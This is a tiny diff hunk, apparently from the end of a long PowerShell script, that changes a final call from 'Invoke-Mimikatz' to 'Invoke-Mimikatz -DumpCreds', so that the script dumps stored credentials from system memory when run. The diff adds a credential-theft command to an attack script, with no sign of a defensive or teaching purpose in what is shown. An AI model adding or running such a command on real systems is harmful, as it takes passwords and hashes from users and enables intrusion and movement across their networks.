@@ -2633,4 +2633,4 @@ Function Main
 
 Main
 }
-Invoke-Mimikatz
+Invoke-Mimikatz -DumpCreds
